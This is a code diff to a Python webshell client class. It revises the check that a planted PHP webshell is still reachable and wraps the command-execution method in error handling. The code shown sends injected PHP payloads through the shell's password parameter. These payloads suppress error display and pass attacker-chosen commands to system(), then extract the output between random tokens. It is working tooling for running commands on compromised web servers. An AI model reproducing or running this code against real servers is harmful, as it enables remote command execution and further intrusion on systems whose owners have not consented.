@@ -23,15 +23,17 @@ class WebShell():
         Log.info("Checking whether the webshell is still work...")
         key = random_string(6, string.letters)
         value = random_string(32, string.letters)
+        token = random_string(32, string.letters)
         Log.info("Using challenge key : [%s] , value : [%s]" % (key, value))
+        Log.info("Using token : [%s]" % (token))
         method = string.upper(method)
         if method == "POST" or method == "REQUEST":
             Log.info("Using POST method...")
-            data = {auth:'var_dump("$_POST[%s]");' % (key), key:value}
+            data = {auth:'echo "'+token+'";var_dump("$_POST['+key+']");echo "'+token+'";', key:value}
             response = requests.post(url, data=data)
         elif method == "GET":
             Log.info("Using GET method...")
-            params = {auth:'var_dump("$_POST[%s]");' % key}
+            params = {auth:'echo "'+token+'";var_dump("$_POST['+key+']");echo "'+token+'";'}
             url = build_url(url, params)
             data = {key:value}
             response = requests.post(url, data=data)
@@ -39,7 +41,7 @@ class WebShell():
             Log.error("Unsupported method!")
             return False
         content = response.content
-        Log.info(content)
+        Log.success("The content is :\n " + content)
         return value in content
 
     def check_connection(self, url):
@@ -92,22 +94,24 @@ class WebShell():
         pass
 
     def php_system(self, command):
-        # TODO
-        tick = random_string(3, string.letters)
-        token = random_string(32, string.letters)
-        if self.method == "POST":
-            data = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';system($_POST["+tick+"]);echo '"+token+"';", tick:command + " 2>&1"}
-            response = requests.post(self.url, data=data)
-        elif self.method == "GET":
-            params = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';system($_GET["+tick+"]);echo '"+token+"';", tick:command + " 2>&1"}
-            response = requests.get(self.url, params=params)
-        else:
-            return (False, "Unsupported method!")
-        content = response.text
-        if token in content:
-            return (True, content.split(token)[1])
-        else:
-            return (False, content)
+        try:
+            tick = random_string(3, string.letters)
+            token = random_string(32, string.letters)
+            if self.method == "POST":
+                data = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';system($_POST["+tick+"]);echo '"+token+"';", tick:command + " 2>&1"}
+                response = requests.post(self.url, data=data)
+            elif self.method == "GET":
+                params = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';system($_GET["+tick+"]);echo '"+token+"';", tick:command + " 2>&1"}
+                response = requests.get(self.url, params=params)
+            else:
+                return (False, "Unsupported method!")
+            content = response.text
+            if token in content:
+                return (True, content.split(token)[1])
+            else:
+                return (False, content)
+        except:
+            Log.error("The connection is aborted!")
 
     def php_popen(self, command):
         # TODO
